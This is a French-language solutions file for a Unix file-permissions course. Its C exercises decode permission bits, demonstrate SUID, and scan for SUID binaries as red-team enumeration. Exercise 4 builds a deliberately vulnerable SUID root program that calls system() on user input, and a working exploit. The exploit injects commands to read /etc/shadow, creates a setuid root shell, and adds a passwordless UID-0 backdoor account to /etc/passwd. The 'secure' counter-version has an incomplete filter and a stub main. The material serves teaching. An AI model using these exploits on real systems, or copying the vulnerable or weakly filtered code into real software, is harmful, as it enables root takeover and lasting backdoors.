# Solutions - File Permissions

## Exercice 1 : Découverte (Très facile)

### Objectif
Afficher les permissions d'un fichier en format octal et décoder les bits SUID/SGID

### Solution

```c
// solution_ex1.c - Analyser les permissions d'un fichier
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>

// Convertir les permissions en chaîne rwx
void mode_to_string(mode_t mode, char *str) {
    // Type de fichier
    if (S_ISDIR(mode))      str[0] = 'd';
    else if (S_ISLNK(mode)) str[0] = 'l';
    else                    str[0] = '-';

    // Permissions owner
    str[1] = (mode & S_IRUSR) ? 'r' : '-';
    str[2] = (mode & S_IWUSR) ? 'w' : '-';
    str[3] = (mode & S_IXUSR) ? ((mode & S_ISUID) ? 's' : 'x') : ((mode & S_ISUID) ? 'S' : '-');

    // Permissions group
    str[4] = (mode & S_IRGRP) ? 'r' : '-';
    str[5] = (mode & S_IWGRP) ? 'w' : '-';
    str[6] = (mode & S_IXGRP) ? ((mode & S_ISGID) ? 's' : 'x') : ((mode & S_ISGID) ? 'S' : '-');

    // Permissions other
    str[7] = (mode & S_IROTH) ? 'r' : '-';
    str[8] = (mode & S_IWOTH) ? 'w' : '-';
    str[9] = (mode & S_IXOTH) ? ((mode & S_ISVTX) ? 't' : 'x') : ((mode & S_ISVTX) ? 'T' : '-');

    str[10] = '\0';
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <fichier>\n", argv[0]);
        return 1;
    }

    struct stat st;
    if (stat(argv[1], &st) != 0) {
        perror("stat");
        return 1;
    }

    // Afficher le nom du fichier
    printf("[*] Analyse de: %s\n\n", argv[1]);

    // Permissions en octal
    printf("[+] Permissions octales: %04o\n", st.st_mode & 07777);

    // Permissions en chaîne (format ls)
    char perm_str[11];
    mode_to_string(st.st_mode, perm_str);
    printf("[+] Permissions string:  %s\n\n", perm_str);

    // Décomposition des bits spéciaux
    printf("[*] Bits spéciaux:\n");
    printf("    SUID (Set-UID):   %s\n", (st.st_mode & S_ISUID) ? "OUI (4000)" : "non");
    printf("    SGID (Set-GID):   %s\n", (st.st_mode & S_ISGID) ? "OUI (2000)" : "non");
    printf("    Sticky bit:       %s\n", (st.st_mode & S_ISVTX) ? "OUI (1000)" : "non");

    // Owner et groupe
    printf("\n[*] Ownership:\n");
    printf("    UID: %d\n", st.st_uid);
    printf("    GID: %d\n", st.st_gid);

    // Warnings de sécurité
    printf("\n[*] Analyse de sécurité:\n");

    if (st.st_mode & S_ISUID) {
        if (st.st_uid == 0) {
            printf("    [!] WARNING: Binaire SUID root (élévation de privilèges possible!)\n");
        } else {
            printf("    [!] SUID actif (s'exécute avec UID=%d)\n", st.st_uid);
        }
    }

    if ((st.st_mode & S_IWOTH)) {
        printf("    [!] WARNING: Fichier modifiable par tous (world-writable)\n");
    }

    if ((st.st_mode & S_ISUID) && (st.st_mode & S_IWGRP)) {
        printf("    [!] CRITICAL: SUID + group-writable (vulnérabilité!)\n");
    }

    return 0;
}
```

**Compilation et tests:**

```bash
gcc -o solution_ex1 solution_ex1.c

# Tester sur différents fichiers
./solution_ex1 /bin/ls
./solution_ex1 /usr/bin/passwd    # SUID root
./solution_ex1 /tmp               # Sticky bit
./solution_ex1 solution_ex1.c
```

**Explication:**
- `stat()` récupère les métadonnées d'un fichier
- `st.st_mode` contient les permissions et le type de fichier
- Les macros `S_ISUID`, `S_ISGID`, `S_ISVTX` testent les bits spéciaux
- Le bit SUID remplace 'x' par 's' dans les permissions owner

---

## Exercice 2 : Modification (Facile)

### Objectif
Créer un programme SUID qui affiche l'UID réel et effectif

### Solution

```c
// solution_ex2.c - Démonstration SUID
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(void) {
    uid_t real_uid = getuid();        // UID de l'utilisateur qui a lancé le programme
    uid_t effective_uid = geteuid();  // UID effectif (celui du owner si SUID)

    printf("[*] Informations UID:\n");
    printf("    Real UID (ruid):      %d\n", real_uid);
    printf("    Effective UID (euid): %d\n", effective_uid);

    if (effective_uid == 0) {
        printf("\n[!] Ce programme s'exécute avec les privilèges ROOT!\n");
        printf("[*] Actions possibles:\n");
        printf("    - Lire n'importe quel fichier\n");
        printf("    - Modifier les permissions\n");
        printf("    - Créer des fichiers owned by root\n");

        // Démonstration: créer un fichier en tant que root
        printf("\n[+] Création de /tmp/suid_test_file (owned by root)...\n");

        FILE *f = fopen("/tmp/suid_test_file", "w");
        if (f) {
            fprintf(f, "Fichier créé par SUID program\n");
            fprintf(f, "Owner UID: %d (root)\n", geteuid());
            fclose(f);
            printf("[+] Fichier créé! Vérifiez avec: ls -l /tmp/suid_test_file\n");
        }

    } else if (effective_uid != real_uid) {
        printf("\n[*] Ce programme s'exécute avec un UID différent (SUID actif)\n");
        printf("[*] Owner UID: %d\n", effective_uid);
    } else {
        printf("\n[*] Pas de SUID actif (euid == ruid)\n");
    }

    return 0;
}
```

**Compilation et activation SUID:**

```bash
# Compiler
gcc -o solution_ex2 solution_ex2.c

# Test normal (sans SUID)
./solution_ex2
# Real UID (ruid):      1000
# Effective UID (euid): 1000

# Activer SUID (nécessite root)
sudo chown root:root solution_ex2
sudo chmod 4755 solution_ex2

# Vérifier
ls -l solution_ex2
# -rwsr-xr-x 1 root root ... solution_ex2
#    ^
#    └─ 's' indique SUID actif

# Test avec SUID actif
./solution_ex2
# Real UID (ruid):      1000  (votre user)
# Effective UID (euid): 0     (root!)
# [!] Ce programme s'exécute avec les privilèges ROOT!

# Vérifier le fichier créé
ls -l /tmp/suid_test_file
# -rw-r--r-- 1 root root ... /tmp/suid_test_file
```

**Explication:**
- `getuid()` : retourne l'UID réel (qui a lancé le programme)
- `geteuid()` : retourne l'UID effectif (avec lequel le programme s'exécute)
- Avec SUID, `euid` devient celui du propriétaire du fichier
- `chmod 4755` : le '4' active le bit SUID

---

## Exercice 3 : Création (Moyen)

### Objectif
Scanner le système pour trouver tous les binaires SUID/SGID

### Solution

```c
// solution_ex3.c - Scanner de binaires SUID/SGID
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <dirent.h>
#include <unistd.h>
#include <pwd.h>

// Structure pour stocker un binaire SUID
typedef struct {
    char path[512];
    uid_t owner;
    mode_t mode;
    int is_suid;
    int is_sgid;
} SuidBinary;

// Liste pour stocker les résultats
SuidBinary *results = NULL;
int result_count = 0;
int result_capacity = 0;

// Ajouter un résultat
void add_result(const char *path, struct stat *st, int is_suid, int is_sgid) {
    if (result_count >= result_capacity) {
        result_capacity = (result_capacity == 0) ? 100 : result_capacity * 2;
        results = realloc(results, result_capacity * sizeof(SuidBinary));
    }

    SuidBinary *sb = &results[result_count++];
    strncpy(sb->path, path, sizeof(sb->path) - 1);
    sb->owner = st->st_uid;
    sb->mode = st->st_mode;
    sb->is_suid = is_suid;
    sb->is_sgid = is_sgid;
}

// Scanner un répertoire récursivement
void scan_directory(const char *path, int max_depth) {
    if (max_depth <= 0) return;

    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        // Ignorer . et ..
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        // Construire le chemin complet
        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (lstat(fullpath, &st) != 0)
            continue;

        // Vérifier si c'est un fichier régulier
        if (S_ISREG(st.st_mode)) {
            int is_suid = (st.st_mode & S_ISUID) != 0;
            int is_sgid = (st.st_mode & S_ISGID) != 0;

            // Si SUID ou SGID, ajouter aux résultats
            if (is_suid || is_sgid) {
                add_result(fullpath, &st, is_suid, is_sgid);
            }
        }
        // Si c'est un répertoire, scanner récursivement
        else if (S_ISDIR(st.st_mode)) {
            scan_directory(fullpath, max_depth - 1);
        }
    }

    closedir(dir);
}

// Obtenir le nom d'utilisateur depuis UID
const char* get_username(uid_t uid) {
    struct passwd *pw = getpwuid(uid);
    return pw ? pw->pw_name : "???";
}

// Trier par dangerosité (SUID root d'abord)
int compare_danger(const void *a, const void *b) {
    SuidBinary *sa = (SuidBinary *)a;
    SuidBinary *sb = (SuidBinary *)b;

    // SUID root en premier
    if (sa->is_suid && sa->owner == 0 && !(sb->is_suid && sb->owner == 0))
        return -1;
    if (sb->is_suid && sb->owner == 0 && !(sa->is_suid && sa->owner == 0))
        return 1;

    // Puis SUID non-root
    if (sa->is_suid && !sb->is_suid) return -1;
    if (sb->is_suid && !sa->is_suid) return 1;

    // Puis SGID
    return 0;
}

int main(int argc, char *argv[]) {
    printf("╔═══════════════════════════════════════════════════════╗\n");
    printf("║   Scanner SUID/SGID - Recherche de binaires          ║\n");
    printf("║   Red Team - Privilege Escalation Enumeration        ║\n");
    printf("╚═══════════════════════════════════════════════════════╝\n\n");

    // Chemins à scanner
    const char *search_paths[] = {
        "/bin",
        "/sbin",
        "/usr/bin",
        "/usr/sbin",
        "/usr/local/bin",
        "/usr/local/sbin",
        NULL
    };

    printf("[*] Scanning système...\n");

    // Scanner chaque chemin
    for (int i = 0; search_paths[i]; i++) {
        printf("[*] Scanning %s...\n", search_paths[i]);
        scan_directory(search_paths[i], 5);  // max depth = 5
    }

    // Trier par dangerosité
    qsort(results, result_count, sizeof(SuidBinary), compare_danger);

    // Afficher les résultats
    printf("\n[+] Trouvé %d binaires SUID/SGID\n\n", result_count);

    printf("%-50s %-8s %-10s %-6s\n", "PATH", "OWNER", "TYPE", "PERMS");
    printf("════════════════════════════════════════════════════════════════════════\n");

    int suid_root_count = 0;
    for (int i = 0; i < result_count; i++) {
        SuidBinary *sb = &results[i];

        const char *type;
        if (sb->is_suid && sb->is_sgid) type = "SUID+SGID";
        else if (sb->is_suid) type = "SUID";
        else type = "SGID";

        // Marquer les SUID root (plus dangereux)
        const char *marker = "";
        if (sb->is_suid && sb->owner == 0) {
            marker = " [!]";
            suid_root_count++;
        }

        printf("%-50s %-8s %-10s %04o%s\n",
               sb->path,
               get_username(sb->owner),
               type,
               sb->mode & 07777,
               marker);
    }

    printf("\n[*] Statistiques:\n");
    printf("    SUID root:     %d (DANGEREUX - vecteurs d'escalation)\n", suid_root_count);
    printf("    SUID non-root: %d\n", result_count - suid_root_count);

    printf("\n[*] TIP: Testez les binaires SUID root avec GTFOBins:\n");
    printf("    https://gtfobins.github.io/\n");

    free(results);
    return 0;
}
```

**Compilation et utilisation:**

```bash
gcc -o solution_ex3 solution_ex3.c

# Scanner le système (peut prendre quelques secondes)
./solution_ex3

# Sortie exemple:
# [+] Trouvé 47 binaires SUID/SGID
#
# PATH                                           OWNER    TYPE       PERMS
# ═══════════════════════════════════════════════════════════════════
# /usr/bin/passwd                                root     SUID       4755 [!]
# /usr/bin/sudo                                  root     SUID       4755 [!]
# /usr/bin/su                                    root     SUID       4755 [!]
# /usr/bin/mount                                 root     SUID       4755 [!]
# ...
```

**Explication:**
- On scanne récursivement les répertoires système
- Pour chaque fichier, on vérifie les bits SUID/SGID avec `st.st_mode & S_ISUID`
- Les résultats sont triés par dangerosité (SUID root en premier)
- Les binaires marqués `[!]` sont des cibles potentielles pour privilege escalation

---

## Exercice 4 : Challenge (Difficile)

### Objectif
Créer un binaire SUID vulnérable et son exploit pour démontrer l'escalation de privilèges

### Solution

**Partie 1: Binaire SUID vulnérable**

```c
// vulnerable_suid.c - Binaire SUID intentionnellement vulnérable
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// Fonction qui lit un fichier (vulnérable à path traversal)
void read_file(const char *filename) {
    char command[256];

    // VULNÉRABILITÉ 1: Utilisation de system() avec input non sanitizé
    snprintf(command, sizeof(command), "cat %s", filename);

    printf("[*] Lecture du fichier: %s\n", filename);
    system(command);  // ← DANGEREUX si SUID root!
}

// Fonction qui copie un fichier (vulnérable)
void copy_file(const char *src, const char *dst) {
    char command[512];

    // VULNÉRABILITÉ 2: Path injection
    snprintf(command, sizeof(command), "cp %s %s", src, dst);

    printf("[*] Copie: %s -> %s\n", src, dst);
    system(command);
}

int main(int argc, char *argv[]) {
    printf("[*] File Manager SUID\n");
    printf("[*] Effective UID: %d\n\n", geteuid());

    if (argc < 3) {
        fprintf(stderr, "Usage:\n");
        fprintf(stderr, "  %s read <file>\n", argv[0]);
        fprintf(stderr, "  %s copy <src> <dst>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "read") == 0) {
        read_file(argv[2]);
    } else if (strcmp(argv[1], "copy") == 0 && argc == 4) {
        copy_file(argv[2], argv[3]);
    } else {
        fprintf(stderr, "Commande invalide\n");
        return 1;
    }

    return 0;
}
```

**Partie 2: Exploit**

```c
// exploit_ex4.c - Exploit pour escalation de privilèges
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_banner(void) {
    printf("\n");
    printf("╔═══════════════════════════════════════════════════╗\n");
    printf("║   SUID Privilege Escalation Exploit              ║\n");
    printf("║   Target: vulnerable_suid                        ║\n");
    printf("╚═══════════════════════════════════════════════════╝\n");
    printf("\n");
}

void exploit_method_1(void) {
    printf("[*] Méthode 1: Command Injection via 'read'\n");
    printf("[*] Objectif: Lire /etc/shadow (root only)\n\n");

    // Injection de commande: le ; permet d'exécuter plusieurs commandes
    printf("[+] Payload: /etc/passwd; cat /etc/shadow #\n");
    system("./vulnerable_suid read '/etc/passwd; cat /etc/shadow #'");

    printf("\n[+] /etc/shadow lu avec succès!\n");
}

void exploit_method_2(void) {
    printf("[*] Méthode 2: Obtenir un root shell\n");
    printf("[*] Objectif: Créer un binaire SUID shell\n\n");

    // Créer un shell simple
    printf("[+] Création du shell...\n");

    FILE *f = fopen("/tmp/rootshell.c", "w");
    if (!f) {
        perror("fopen");
        return;
    }

    fprintf(f,
        "#include <stdio.h>\n"
        "#include <unistd.h>\n"
        "int main() {\n"
        "    setuid(0);\n"
        "    setgid(0);\n"
        "    printf(\"[+] Root shell spawned!\\n\");\n"
        "    execl(\"/bin/bash\", \"bash\", \"-p\", NULL);\n"
        "    return 0;\n"
        "}\n"
    );
    fclose(f);

    // Compiler
    printf("[+] Compilation...\n");
    system("gcc -o /tmp/rootshell /tmp/rootshell.c");

    // Utiliser le binaire vulnérable pour copier et chown
    printf("[+] Exploitation via 'copy'...\n");

    // Payload: utiliser && pour exécuter plusieurs commandes
    system("./vulnerable_suid copy '/tmp/rootshell; chmod +s /tmp/rootshell #' /dev/null");

    printf("\n[+] Exploit terminé!\n");
    printf("[+] Lancez: /tmp/rootshell\n");
    printf("[+] Vous obtiendrez un shell root!\n");
}

void exploit_method_3(void) {
    printf("[*] Méthode 3: Backdoor /etc/passwd\n");
    printf("[*] Objectif: Ajouter un user root sans password\n\n");

    // Créer une ligne /etc/passwd pour un user root
    FILE *f = fopen("/tmp/passwd_entry", "w");
    if (!f) {
        perror("fopen");
        return;
    }

    // hacker:x:0:0::/root:/bin/bash (UID=0, GID=0 = root)
    fprintf(f, "hacker::0:0:Backdoor:/root:/bin/bash\n");
    fclose(f);

    printf("[+] Payload créé dans /tmp/passwd_entry\n");
    printf("[+] Injection via command injection...\n");

    // Utiliser cat + >> pour append à /etc/passwd
    system("./vulnerable_suid read '/tmp/passwd_entry; cat /tmp/passwd_entry >> /etc/passwd #'");

    printf("\n[+] Backdoor installé!\n");
    printf("[+] Connectez-vous avec: su hacker\n");
    printf("[+] Password: <vide> (appuyez juste Enter)\n");
}

int main(int argc, char *argv[]) {
    print_banner();

    // Vérifier que le binaire vulnérable existe
    if (access("./vulnerable_suid", X_OK) != 0) {
        fprintf(stderr, "[-] Erreur: ./vulnerable_suid introuvable\n");
        fprintf(stderr, "[-] Compilez d'abord: sudo gcc -o vulnerable_suid vulnerable_suid.c && sudo chown root vulnerable_suid && sudo chmod 4755 vulnerable_suid\n");
        return 1;
    }

    printf("[*] Méthodes d'exploitation disponibles:\n");
    printf("    1. Command injection - Lire /etc/shadow\n");
    printf("    2. Créer un SUID shell\n");
    printf("    3. Backdoor /etc/passwd\n");
    printf("\n");

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <1|2|3>\n", argv[0]);
        return 1;
    }

    int method = atoi(argv[1]);

    switch (method) {
        case 1:
            exploit_method_1();
            break;
        case 2:
            exploit_method_2();
            break;
        case 3:
            exploit_method_3();
            break;
        default:
            fprintf(stderr, "Méthode invalide\n");
            return 1;
    }

    return 0;
}
```

**Setup et exploitation:**

```bash
# 1. Compiler le binaire vulnérable
gcc -o vulnerable_suid vulnerable_suid.c

# 2. Activer SUID root (nécessite sudo)
sudo chown root:root vulnerable_suid
sudo chmod 4755 vulnerable_suid

# Vérifier
ls -l vulnerable_suid
# -rwsr-xr-x 1 root root ... vulnerable_suid

# 3. Compiler l'exploit
gcc -o exploit_ex4 exploit_ex4.c

# 4. Lancer les exploits
./exploit_ex4 1  # Command injection
./exploit_ex4 2  # Root shell
./exploit_ex4 3  # Backdoor /etc/passwd

# 5. Obtenir un root shell
/tmp/rootshell
# [+] Root shell spawned!
# root@machine:~#
```

**Contre-mesures (code sécurisé):**

```c
// secure_suid.c - Version sécurisée
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

// Vérifier que le chemin est sûr (pas de path traversal)
int is_safe_path(const char *path) {
    // Bloquer ../ et chemins absolus dangereux
    if (strstr(path, "..") || strstr(path, ";") || strstr(path, "|")) {
        return 0;
    }
    if (path[0] == '/' && strncmp(path, "/home/", 6) != 0) {
        return 0;  // Bloquer les chemins absolus sauf /home/
    }
    return 1;
}

void read_file_secure(const char *filename) {
    // JAMAIS utiliser system() avec input utilisateur!
    // Utiliser open() + read() à la place

    if (!is_safe_path(filename)) {
        fprintf(stderr, "[-] Chemin refusé pour raisons de sécurité\n");
        return;
    }

    int fd = open(filename, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return;
    }

    char buffer[4096];
    ssize_t n;
    while ((n = read(fd, buffer, sizeof(buffer))) > 0) {
        write(STDOUT_FILENO, buffer, n);
    }

    close(fd);
}

int main(int argc, char *argv[]) {
    // Dropper les privilèges si pas nécessaire
    if (geteuid() == 0 && getuid() != 0) {
        printf("[*] Dropping privileges...\n");
        setuid(getuid());
    }

    // Code sécurisé ici...

    return 0;
}
```

**Explication des vulnérabilités:**
- `system()` avec input utilisateur = command injection
- Pas de validation des chemins = path traversal
- SUID root + vulnérabilité = full root access
- L'exploit utilise `;` pour injecter des commandes supplémentaires

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [x] Lire et interpréter les permissions d'un fichier
- [x] Comprendre la différence entre UID réel et effectif
- [x] Créer et activer un binaire SUID
- [x] Scanner le système pour trouver les SUID/SGID
- [x] Identifier les vulnérabilités dans les binaires SUID
- [x] Exploiter un binaire SUID pour privilege escalation
- [x] Écrire du code SUID sécurisé
- [x] Connaître les contre-mesures et bonnes pratiques
